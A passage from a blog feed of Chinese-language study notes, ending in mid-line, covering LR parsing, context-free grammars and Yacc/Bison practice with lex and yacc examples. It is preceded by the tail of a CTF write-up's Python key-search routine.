class="hljs-comment">#print(prefix, bytearray(ans))</span><br>    print(prefix, <span class="hljs-string">&quot;all sets:&quot;</span> , <span class="hljs-built_in">bytearray</span>(k))<br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> k:<br>        keyset[i] = jj<br>        ans[pos] = jj<br>        print(prefix, <span class="hljs-string">&quot;Try %d is %s&quot;</span> % (i, <span class="hljs-built_in">chr</span>(jj)))<br>        <span class="hljs-keyword">if</span> i &gt;= <span class="hljs-built_in">len</span>(target) - <span class="hljs-number">1</span>:<br>            print(prefix, <span class="hljs-string">&quot;ans: &quot;</span> , ans)<br>            <span class="hljs-comment">#raise</span><br>        dfs(<span class="hljs-built_in">bytearray</span>(keyset),  <span class="hljs-built_in">bytearray</span>(ans), i + <span class="hljs-number">1</span>)<br>    print(prefix, <span class="hljs-string">&quot;Bcurrent i:%d pos:%d &quot;</span> % (i, pos))<br>    print(prefix, <span class="hljs-built_in">bytearray</span>(keyset[<span class="hljs-number">0</span>:i]))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LR Parse</title>
    <link href="/2021/01/11/LR-Parse/"/>
    <url>/2021/01/11/LR-Parse/</url>
    
    <content type="html"><![CDATA[<h1 id="LR-Parse"><a href="#LR-Parse" class="headerlink" title="LR Parse"></a>LR Parse</h1><p>个人学习理解，可能有许多理解或者表达上的错误，若有发现错误，欢迎帮我纠正～</p><p>L: left to right parsing<br>R: rightmost derivation</p><p>LR 分析器结构</p><ul><li>Table-based</li><li>Actions<ul><li>Shift （移进）</li><li>Reduce （归约）</li></ul></li><li>Data Structures<ul><li>Stack of states/symbols {s}</li><li>Action table: action[s, a]; a是终结符</li><li>Goto table: goto[s, X]; X是非终结符</li></ul></li></ul><p>LR(K) 代表: 从左至右分析、最右边推导、超前查看 k 个单词</p><h2 id="Bottom-up-自底向上的分析"><a href="#Bottom-up-自底向上的分析" class="headerlink" title="Bottom-up 自底向上的分析"></a>Bottom-up 自底向上的分析</h2><img src="/2021/01/11/LR-Parse/image-20210109173502058.png" class="" title="image-20210109173502058"><p>Bottom-up 方式，最终得到的是开始符号<code>s</code>， 换句话讲，构建语法分析树的时候，从叶子结点得到根，如图</p><img src="/2021/01/11/LR-Parse/Parsing1.png" class="" title="img"><p><code>LR</code> 就是一种常见的使用 <code>bottom-up</code>分析的 语法分析器。 </p><p>Bottom-up  语法分析器的分类</p><img src="/2021/01/11/LR-Parse/Parsing2.png" class="" title="img"><p>LR(0) -&gt; SLR(1) -&gt;  LR(1) -&gt; LALR(1)</p><h2 id="Shift-amp-Reduce"><a href="#Shift-amp-Reduce" class="headerlink" title="Shift &amp; Reduce"></a>Shift &amp; Reduce</h2><p>移进（Shift）、归约（Reduce）是 LR 分析器工作中对输入符号进行处理的两种操作。</p><p>移进（Shift）操作：将输入的符号压入到 LR 分析栈。<br>归约 （Reduce）操作：将 LR 分析栈顶部的某一项或多项用某个产生式归约。换句话说，若栈顶的某些项符合某条产生式的右部，则将这几项出栈，然后将产生式的左部入栈。例如，栈顶有 ABC 三项， 有产生式<code>P -&gt; A B C</code>  则将 A B C 出栈，将 P 入栈，最终栈中只剩下 P。</p><p>Action table 和 Goto table 用来指导 LR 分析器进行 Shift 还是 Reduce 操作。</p><h2 id="Action-amp-Goto-Table"><a href="#Action-amp-Goto-Table" class="headerlink" title="Action &amp; Goto Table"></a>Action &amp; Goto Table</h2><p>这就有点像有限自动机了， LR 分析栈中的值实际上是状态的 ID。</p><img src="/2021/01/11/LR-Parse/image-20210110201419029.png" class="" title="image-20210110201419029"><img src="/2021/01/11/LR-Parse/image-20210110201454665.png" class="" title="image-20210110201454665"><h3 id="action-表的说明：-action-s-a"><a href="#action-表的说明：-action-s-a" class="headerlink" title="action 表的说明： action[s, a]"></a>action 表的说明： action[s, a]</h3><p>s: State ，类似 DFA 中的状态，输入符号可以转移状态。<br>a: 符号，类似 DFA 中的符号，输入符号可以转移状态。</p><p>每一行都是一个状态( State ), 列是非终结符和终结符组成，非终结符部分构成 Goto 表，用来记录归约后切换的目标状态。</p><p>action 表的值有 4 种类型:</p><ul><li>SX : Shift X   X代表状态的 ID<ul><li>push state X  把 X 状态压入到分析栈</li><li>read new a 读取一个新的字符 a</li></ul></li><li>RX: Reduce X <ul><li>使用产生式 X: $P-&gt;Y_1Y_2…Y_k$ 归约</li><li>弹出栈中 k 项，后取栈顶状态 u</li><li>压栈：  goto [ u, P ]</li></ul></li><li>A： Accept 识别句子成功</li><li>无值：语法错误</li></ul><h3 id="Goto-表，goto-u-p"><a href="#Goto-表，goto-u-p" class="headerlink" title="Goto 表，goto [ u, p ]"></a>Goto 表，goto [ u, p ]</h3><p>u 是归约后栈顶的状态 ID，P 是非终结符，其实就相当于切换到状态 u 中 P 非终结符的表格的值对应的状态。</p><h2 id="Action-Goto-表的构造算法"><a href="#Action-Goto-表的构造算法" class="headerlink" title="Action/Goto 表的构造算法"></a>Action/Goto 表的构造算法</h2><p>这一块很抽象，涉及到很多离散数学中的理论，目前我还没系统学习离散数学，理解和表达可能有一些偏差和错误。</p><p>构造思路与 NFA 转 DFA 所采用的子集构造法类似。首先找出文法中独立的状态，然后计算每个状态对字母表中每一个字符的转移状态，最后合成一张表。</p><h3 id="Configuration-Set"><a href="#Configuration-Set" class="headerlink" title="Configuration Set"></a>Configuration Set</h3><ul><li>每一个集合代表一个状态</li></ul><h3 id="“点”-记号"><a href="#“点”-记号" class="headerlink" title="“点” 记号"></a>“点” 记号</h3><p>$T-&gt;T·F$</p><p>这里的 <code>·</code>是记号，在 F 的左侧，可以预测所有 F 可以推出的产生式，例如:<br>$T-&gt;T·F$<br>$F-&gt;·(T)$<br>$F-&gt;·id$<br>这些产生式构成的集合就是 Configuration Set</p><h3 id="Closure"><a href="#Closure" class="headerlink" title="Closure"></a>Closure</h3><ul><li><p>Closure 性质<br>如果 $T-&gt;X_1…X_i·X_{i+1}…X_n$ 在集合中，$X_{i+1}$是非终结符，那么$X_{i+1}-&gt;·Y_1Y_2…Y_n$ 也在该集合中。</p><p>若 $Y_1$ 是非终结符，则继续像集合中添加 $Y_1-&gt;·Z_1Z_2Z_3…Z_n$ 直到 <code>·</code>遇到终结符。</p></li><li><p>Configuration 初始： $closure(S’-&gt;·S)$ </p></li><li><p>Compute as fixed point</p></li></ul><p>Closure 计算例子</p><img src="/2021/01/11/LR-Parse/image-20210110224340022.png" class="" title="image-20210110224340022"><h3 id="Successor-I-X"><a href="#Successor-I-X" class="headerlink" title="Successor(I, X)"></a>Successor(I, X)</h3><p>移动 Configuration Set 中点的位置。</p><ul><li>保留所有“点”后面是 X 的产生式，$$X \in (N \cup T)$$</li><li>将“点”向右移动一个字符</li><li>重新计算闭包</li></ul><p>例如 Successor(I, ‘(‘) 这里的 I 是 Closure 例子中 I 集合</p><p>I 中只有 $F-&gt;·(T)$ 满足“点”后面的字符是“(” ，将“点”的位置向右移动 1 个字符，计算 $closure({F-&gt;(·T)})$ 作为结果</p><img src="/2021/01/11/LR-Parse/image-20210110231017396.png" class="" title="image-20210110231017396"><h3 id="合在一起，求-G-的所有-states"><a href="#合在一起，求-G-的所有-states" class="headerlink" title="合在一起，求 G 的所有 states"></a>合在一起，求 G 的所有 states</h3><img src="/2021/01/11/LR-Parse/image-20210110234117460.png" class="" title="image-20210110234117460"><h3 id="构造例子"><a href="#构造例子" class="headerlink" title="构造例子"></a>构造例子</h3><img src="/2021/01/11/LR-Parse/image-20210111000532297.png" class="" title="image-20210111000532297"><p>构造的Action/Goto表如下</p><img src="/2021/01/11/LR-Parse/image-20210111000652699.png" class="" title="image-20210111000652699"><h3 id="Viable-Prefix-in-Bottom-up-（不知道这个有什么用，先挂这）"><a href="#Viable-Prefix-in-Bottom-up-（不知道这个有什么用，先挂这）" class="headerlink" title="Viable Prefix in Bottom-up （不知道这个有什么用，先挂这）"></a>Viable Prefix in Bottom-up （不知道这个有什么用，先挂这）</h3><h4 id="两个概念"><a href="#两个概念" class="headerlink" title="两个概念"></a>两个概念</h4><ul><li>Viable Prefix</li><li>Handle</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">A=&gt;B+<span class="hljs-function"><span class="hljs-params">id</span>=&gt;</span>(E)+id  <br>(rightmost derivation) <br></code></pre></td></tr></table></figure><table><thead><tr><th>Operation performed</th><th align="left">Stack</th><th>Comments</th></tr></thead><tbody><tr><td>(.E)+id</td><td align="left">(</td><td>shift (</td></tr><tr><td>(E.)+id</td><td align="left">( E</td><td>shift E</td></tr><tr><td>(E).+id</td><td align="left">( E )</td><td>shift )</td></tr><tr><td>B.+id</td><td align="left">B</td><td>reduce (E) to B</td></tr><tr><td>B+.id</td><td align="left">B +</td><td>shift +</td></tr><tr><td>B+id.</td><td align="left">B + id</td><td>shift id</td></tr><tr><td>A</td><td align="left">A</td><td>reduce B + id to A</td></tr></tbody></table><p>得到 <code>(E).+id</code>  的下一步  <code>(E)+ </code> 不在 Stack 中，取而代之的是 <code>B +</code> , 这是因为 <code>(E)</code> 是一个 <code>handle</code> ,  Stack 中的所有元素不能在 <code>handle</code> 的上入栈。</p><p><code>(</code>,<code>(E</code>,<code>(E)</code> 都是 <code>(E) handle</code> 的 <code>viable prefix</code></p><p><code>Shift Reduce Parser</code> 的 Stack 中只能放 <code>viable prefix</code>, 遇到 <code>handle</code> 要进行 <code>reduce</code> 操作。</p><p>通俗点讲，Parser 在工作的时候，对输入符号序列执行 shift 操作，直到遇到一个 handle。遇到 一个 handle 用相应的产生式(production)把 handle 替换成对应的非终结符，<code>Bottom-up</code> 用 <code>right-side</code> 替换 <code>left-side</code>。</p><p><code>viable prefixes </code> 用来辅助 Parser 决定 shift / reduce 操作。</p><h2 id="Referrence"><a href="#Referrence" class="headerlink" title="Referrence"></a>Referrence</h2><p><a href="https://www.geeksforgeeks.org/viable-prefix-in-bottom-up-parsing/">https://www.geeksforgeeks.org/viable-prefix-in-bottom-up-parsing/</a></p><p><a href="https://www.geeksforgeeks.org/shift-reduce-parser-compiler/">https://www.geeksforgeeks.org/shift-reduce-parser-compiler/</a></p><p><a href="http://anoopsarkar.github.io/compilers-class/assets/lectures/lr2-lr_0-parsing.pdf">http://anoopsarkar.github.io/compilers-class/assets/lectures/lr2-lr_0-parsing.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Context-Free Grammars</title>
    <link href="/2021/01/03/Context-Free-Grammars/"/>
    <url>/2021/01/03/Context-Free-Grammars/</url>
    
    <content type="html"><![CDATA[<h1 id="Context-Free-Grammars"><a href="#Context-Free-Grammars" class="headerlink" title="Context-Free Grammars"></a>Context-Free Grammars</h1><h2 id="Brief-Introduction"><a href="#Brief-Introduction" class="headerlink" title="Brief Introduction"></a>Brief Introduction</h2><h3 id="正则文法-VS-上下文无关文法"><a href="#正则文法-VS-上下文无关文法" class="headerlink" title="正则文法 VS 上下文无关文法"></a>正则文法 VS 上下文无关文法</h3><p>正则文法不能表示程序语言的递归结构，递归结构在程序语言中非常常见，比如 if 中可以嵌套 if、括号中可以嵌套括号、表达式中可以嵌套表达式。</p><p>正则文法无法识别 <em>((()))</em> 这种具有递归形式的结构，因为正则文法不具备动态记忆功能，即没有一个正则表达式能识别 n 个 <code>(</code> ，后再识别 n 个 <code>)</code>。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">正则表达式 <span class="hljs-comment">(*)</span>* 可以成功匹配:<br><span class="hljs-comment">()</span><br><span class="hljs-comment">(()</span>)<br><br><span class="hljs-comment">(((()</span><br></code></pre></td></tr></table></figure><p>如果用正则表达式，最后一组可以匹配成功，显然最后一组语法上是错误的。</p><p>Context-Free Grammars (CFG) 则可以很好的解决递归问题, CFG 中识别递归括号可以这样表示</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">S -&gt; <span class="hljs-string">&#x27;(&#x27;</span> S <span class="hljs-string">&#x27;)&#x27;</span><br>S -&gt; ε<br></code></pre></td></tr></table></figure><p>上下文无关文法中，这里的 S 可以称为 <em>非终结符(non-terminal)</em> ，非终结符可以进行进一步的推导，直到不存在非终结符。推导的过程就是将左部(LHS)替换成右部(RHS)。</p><p> ‘(‘ 、 ‘)’ 称为终结符。</p><h3 id="推导-Derivation"><a href="#推导-Derivation" class="headerlink" title="推导(Derivation)"></a>推导(Derivation)</h3><p>推导 ： (()) </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">r1:</span> S -&gt; <span class="hljs-string">&#x27;(&#x27;</span> S <span class="hljs-string">&#x27;)&#x27;</span><br><span class="hljs-symbol">r2:</span> S -&gt; ε<br><br>从开始符 S 开始推导<br>用规则 <span class="hljs-built_in">r1</span> 替换 S     得到（S）<br>用规则 <span class="hljs-built_in">r1</span> 替换 (S)   得到 ((S))<br>用规则 <span class="hljs-built_in">r2</span> 替换 ((S)) 得到 (()) <br>(())  不存在非终结符，推导完成。<br></code></pre></td></tr></table></figure><p>推导可以画成语法解析树（Parse Tree）</p><img src="/2021/01/03/Context-Free-Grammars/image-20210103211637576.png" class="" title="image-20210103211637576"><h3 id="推导方式"><a href="#推导方式" class="headerlink" title="推导方式"></a>推导方式</h3><p>最左推导:<br>每次替换最左侧第一个非终结符</p><p>最右推导:<br>每次替换最右侧第一个非终结符</p><p>如果一个 CFG 存在歧义(Ambiguous)，最左推导和最右推导将得出不同的 Parse Tree。</p><h3 id="Backus-Naur-form-BNF"><a href="#Backus-Naur-form-BNF" class="headerlink" title="Backus Naur form (BNF)"></a>Backus Naur form (BNF)</h3><p>普通记法</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br></code></pre></td></tr></table></figure><p>Backus Naur</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span><span class="hljs-operator">:</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br></code></pre></td></tr></table></figure><p>Yacc 里面采用 BNF 范式</p><h2 id="Ambiguous"><a href="#Ambiguous" class="headerlink" title="Ambiguous"></a>Ambiguous</h2><p>例如用如下 CFG 定义四则运算</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-punctuation">(</span> <span class="hljs-built_in">E</span> <span class="hljs-punctuation">)</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-variable">id</span><br></code></pre></td></tr></table></figure><p>推导 id + id / id</p><p>可以推导出两种 Parse Tree</p><img src="/2021/01/03/Context-Free-Grammars/image-20210103211830200.png" class="" title="image-20210103211830200"><h3 id="如何解决歧义？"><a href="#如何解决歧义？" class="headerlink" title="如何解决歧义？"></a>如何解决歧义？</h3><ol><li>重新设计文法，使文法没有歧义</li><li>指定优先级 (yacc 里面用 %left、%right，具体参考 blog 文章 <a href="/2021/01/02/Yacc-practice/" title="Yacc practice">Yacc practice</a> )</li><li>规定一些语法结构消除歧义</li></ol><p>1，2 主要是利用优先级和结合性消除歧义。</p><h3 id="如何设计优先级消除歧义？"><a href="#如何设计优先级消除歧义？" class="headerlink" title="如何设计优先级消除歧义？"></a>如何设计优先级消除歧义？</h3><p>这是一个有歧义的文法</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">-</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">/</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-punctuation">(</span> <span class="hljs-built_in">E</span> <span class="hljs-punctuation">)</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-variable">id</span><br></code></pre></td></tr></table></figure><p>推导 id - id / id 存在歧义。</p><p>引入另外一个非终结符，使文法推导 id - id / id  没有歧义</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">E -&gt; E - E      E -&gt; T<br>T -&gt; T / T      T -&gt; F<br>F -&gt; id         F -&gt; (E)<br></code></pre></td></tr></table></figure><p>无论采用最左推导还是最右推导，只能得到一颗 Parse Tree</p><img src="/2021/01/03/Context-Free-Grammars/image-20210103213531813.png" class="" title="image-20210103213531813"><h3 id="如何利用结合性消除歧义？"><a href="#如何利用结合性消除歧义？" class="headerlink" title="如何利用结合性消除歧义？"></a>如何利用结合性消除歧义？</h3><p>引入 T 后消除了 id - id / id 的歧义，但是推导 id - id - id 仍然存在歧义，如图：</p><img src="/2021/01/03/Context-Free-Grammars/image-20210103213616891.png" class="" title="image-20210103213616891"><p>‘-‘ 运算符采用左结合，所以改写为左递归文法</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">-</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-built_in">E</span> <span class="hljs-operator">/</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-punctuation">(</span> <span class="hljs-built_in">E</span> <span class="hljs-punctuation">)</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">-&gt;</span> <span class="hljs-variable">id</span><br></code></pre></td></tr></table></figure><p>改写为</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">E -&gt; E - T      E -&gt; T<br>T -&gt; T / F      T -&gt; F<br>F -&gt; id         F -&gt; ( E )<br></code></pre></td></tr></table></figure><h3 id="YACC-中消除歧义"><a href="#YACC-中消除歧义" class="headerlink" title="YACC 中消除歧义"></a>YACC 中消除歧义</h3><p>参考这篇 <a href="/2021/01/02/Yacc-practice/" title="Yacc practice">Yacc practice</a> 中的 <em>实现优先级和结合性</em></p><h2 id="Pushdown-automata-PDA"><a href="#Pushdown-automata-PDA" class="headerlink" title="Pushdown automata, PDA"></a>Pushdown automata, PDA</h2><p>下推自动机</p><p>正则表达式有一个对应的有限状态自动机，上下文无关文法也有一个对应的下推自动机。pushdown automata 其实就是一个栈 + FSA。</p><h3 id="下推自动机-vs-有限状态自动机"><a href="#下推自动机-vs-有限状态自动机" class="headerlink" title="下推自动机 vs 有限状态自动机"></a>下推自动机 vs 有限状态自动机</h3><img src="/2021/01/03/Context-Free-Grammars/image-20210103222755507.png" class="" title="image-20210103222755507"><h3 id="下推自动机的两种操作"><a href="#下推自动机的两种操作" class="headerlink" title="下推自动机的两种操作"></a>下推自动机的两种操作</h3><ul><li>Shift  入栈</li><li>Reduce 出栈根据合并再入栈</li></ul><p>简单讲，就是将遇到的符号入栈，如果栈顶的某几个元素满足某条规则，则用该规则对这几个元素进行 Reduce。</p><img src="/2021/01/03/Context-Free-Grammars/image-20210103224550944.png" class="" title="image-20210103224550944">]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yacc practice</title>
    <link href="/2021/01/02/Yacc-practice/"/>
    <url>/2021/01/02/Yacc-practice/</url>
    
    <content type="html"><![CDATA[<h1 id="Yacc-practice"><a href="#Yacc-practice" class="headerlink" title="Yacc practice"></a>Yacc practice</h1><p>Yacc (Yet Another Compiler Compiler) 是一个用于生成语法分析器C代码的程序，一般配合 lex 使用。</p><p> bison 是 GNU 版本的 yacc 实现。</p><h2 id="识别嵌套括号"><a href="#识别嵌套括号" class="headerlink" title="识别嵌套括号"></a>识别嵌套括号</h2><p>lex 代码:  parens.lex</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-comment">%%</span><br>[ \t]+ &#123; &#125;<br>.  return yytext[<span class="hljs-number">0</span>];<br><span class="hljs-comment">%%</span><br></code></pre></td></tr></table></figure><p>yacc 代码: parens.y</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-meta">%</span><br>S: <span class="hljs-string">&#x27;(&#x27;</span> S <span class="hljs-string">&#x27;)&#x27;</span>|;<br></code></pre></td></tr></table></figure><p>Backus-Naur notation</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">S -&gt; <span class="hljs-string">&quot;(&quot;</span> S <span class="hljs-string">&quot;)&quot;</span> | <span class="hljs-type">&lt;epsilon</span>&gt;<br></code></pre></td></tr></table></figure><p><epsilon> 表示空字符。</p><p>编译方法</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console">bison -oparens.tab.c -d parens.y<br>flex -oparens.lex.c parens.lex<br>gcc -w -o ./parens parens.tab.c parens.lex.c -ly -ll<br></code></pre></td></tr></table></figure><h2 id="Yacc-actions"><a href="#Yacc-actions" class="headerlink" title="Yacc actions"></a>Yacc actions</h2><p>Yacc 和 Lex 一样，Lex 可以为每一个 regexp 指定 action， yacc 亦可为每一个规则指定 action</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">%%<br>S: <span class="hljs-string">&#x27;(&#x27;</span> S <span class="hljs-string">&#x27;)&#x27;</span> &#123; <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span> = <span class="hljs-symbol">$</span><span class="hljs-number">2</span>+<span class="hljs-number">1</span>; printf(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>); &#125;<br> | &#123; <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span> = <span class="hljs-number">0</span>; &#125;<br> ;<br></code></pre></td></tr></table></figure><p><code>$$</code> 为左侧 Token 创建的值，用来传递给 parse tree<br><code>$1</code> 右侧第一个 Token 对应的值<br><code>$2</code> 右侧第二个 Token 对应的值, 上面代码中Token S 在 parse tree 中对应的值<br><code>$3</code> 右侧第三个 Token 对应的值</p><p>上面的程序输入 ((())) 输出如下</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs console">➜  yacc-practice git:(master) ✗ ./parens <br>((()))<br>1<br>2<br>3<br></code></pre></td></tr></table></figure><h2 id="Simple-Expression-Interpreter"><a href="#Simple-Expression-Interpreter" class="headerlink" title="Simple Expression Interpreter"></a>Simple Expression Interpreter</h2><p>简单的表达式求值例子，只有加减赋值，实现解析 a=1+2+3 。</p><p>yacc 使用 %token 关键字定义 Token 常量，yacc 生成 Token 对应的头文件，lex 可引用 yacc 生成的头文件实现共同分析。</p><p>lex 通过 yylval 变量给 yacc 传递必要的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123; <br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt; </span></span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">yylex</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">yyerror</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *)</span></span>;<br>%&#125;<br>%token NAME NUMBER<br><br>%%<br>statement: NAME <span class="hljs-string">&#x27;=&#x27;</span> expression &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c = %d\n&quot;</span>, $<span class="hljs-number">1</span>, $<span class="hljs-number">3</span>); &#125;<br>     | expression  &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, $<span class="hljs-number">1</span>); &#125;<br>     ;<br><br>expression: expression <span class="hljs-string">&#x27;+&#x27;</span> NUMBER &#123; $$ = $<span class="hljs-number">1</span> + $<span class="hljs-number">3</span>; &#125;<br>     | expression <span class="hljs-string">&#x27;-&#x27;</span> NUMBER &#123; $$ = $<span class="hljs-number">1</span> - $<span class="hljs-number">3</span>; &#125;<br>     | NUMBER &#123; $$ = $<span class="hljs-number">1</span>; &#125;<br>     ;<br>%%<br></code></pre></td></tr></table></figure><p>lex 文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;simple-expr.tab.h&quot;</span> <span class="hljs-comment">// from YACC , USE -d option</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> yylval;<br>%&#125;<br>%%<br>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+   &#123; yylval = atoi(yytext); <span class="hljs-keyword">return</span> NUMBER; &#125;<br>[a-z]    &#123; yylval = yytext[<span class="hljs-number">0</span>]; <span class="hljs-keyword">return</span> NAME; &#125;<br>[ \t\n]  <span class="hljs-comment">/* ignore whitespace */</span><br>.        <span class="hljs-keyword">return</span> yytext[<span class="hljs-number">0</span>];<br>%%<br></code></pre></td></tr></table></figure><p>编译(bison 是 GNU 版本的 YACC 实现，flex 是 GNU 版本的 lex 实现)</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nim">bison -osimple-<span class="hljs-built_in">expr</span>.tab.c -d simple-<span class="hljs-built_in">expr</span>.y<br>flex -osimple-<span class="hljs-built_in">expr</span>.lex.c simple-<span class="hljs-built_in">expr</span>.lex<br>cc -o ./simple-<span class="hljs-built_in">expr</span> simple-<span class="hljs-built_in">expr</span>.tab.c simple-<span class="hljs-built_in">expr</span>.lex.c -ly -lfl<br><br>echo <span 